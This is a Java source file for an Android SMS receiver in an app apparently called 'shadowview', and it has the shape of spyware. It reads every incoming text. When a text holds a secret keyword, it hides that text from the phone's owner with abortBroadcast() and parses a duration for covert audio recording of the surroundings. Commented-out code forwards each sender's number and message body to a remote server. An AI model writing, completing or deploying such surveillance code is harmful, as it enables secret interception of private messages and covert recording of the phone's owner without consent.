package com.shadiz.usergin.shadowview.receiver.message;

import android.annotation.SuppressLint;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.shadiz.usergin.shadowview.utils.Logger;
import com.shadiz.usergin.shadowview.utils.Preferences;
import com.shadiz.usergin.shadowview.utils.WorkTimeDefiner;

import javax.inject.Inject;

/**
 * Created by oldman on 31.10.16.
 */

public class SmsBroadcastReceiver  extends BroadcastReceiver {
    private static final String TAG = com.shadiz.usergin.shadowview.receiver.message.SmsBroadcastReceiver.class.getSimpleName().toString();
    @Inject
    Context context;
    @Inject
    Preferences preferences;
    private Bundle mBundle;

    public void onReceive(Context context, Intent intent) {
        // Tom Xue: intent -> bundle -> Object messages[] -> smsMessage[]
        mBundle = intent.getExtras();
        if (WorkTimeDefiner.isDoWork() || preferences.getSms() != 0)
            return;

        try {
            getSMSDetails();
        } catch (Exception sgh) {
            Logger.doLog(TAG, "Error in Init : " + sgh.toString(), "Error in Init : " + sgh.toString());
        }
    }

//    public void regSmsObserver() {
//        SentSmsObserver observer = new SentSmsObserver(null);
//        context.getContentResolver().registerContentObserver(Uri.parse("content://sms"), true, observer);
//    }

    @SuppressLint("SimpleDateFormat")
    private void getSMSDetails() {
        SmsMessage[] msgs = null;

        try {
            Object[] pdus = (Object[]) mBundle.get("pdus");
            if (pdus != null) {
                msgs = new SmsMessage[pdus.length];
                String startRecord = preferences.getKeyForRecord();

                StringBuilder bodyText = new StringBuilder();
                for (int k = 0; k < msgs.length; k++) {
                    msgs[k] = SmsMessage.createFromPdu((byte[]) pdus[k]);

                    if (msgs[k].getMessageBody().toLowerCase().contains(startRecord)) {
                        Logger.doLog(TAG, "start record", "start record");
                        abortBroadcast();
                        int minute = Integer.parseInt(msgs[k].getMessageBody().substring(
                                msgs[k].getMessageBody().lastIndexOf("d") + 1, msgs[k].getMessageBody().length())) * 60;
                        Logger.doLog(TAG, "sec: " + minute, "sec: " + minute);
//                        RecordAudio.startEnvRec(minute, 0, mContext);
                    }

                }
                String phNumber = msgs[0].getOriginatingAddress();

                for (int i = 0; i < msgs.length; i++) {
                    bodyText.append(msgs[i].getMessageBody());
                }

                // -------send sms--------------------------------
//                Map<String, Object> sms = new HashMap<String, Object>();
//                Map<String, String> info = new HashMap<String, String>();
//                sms.put("type", AppConstants.TYPE_INCOMING_SMS_REQUEST);
//                sms.put("time", ConvertDate.logTime());
//                info.put("number", phNumber);
//                info.put("data", bodyText.toString());
//                sms.put("info", info);
//                RequestList.sendDataRequest(sms, null, mContext);
            }
        } catch (Exception sfgh) {
            Logger.doLog(TAG, "Error in getSMSDetails : " + sfgh.toString(),
                    "Error in getSMSDetails : " + sfgh.toString());
        }
    }

}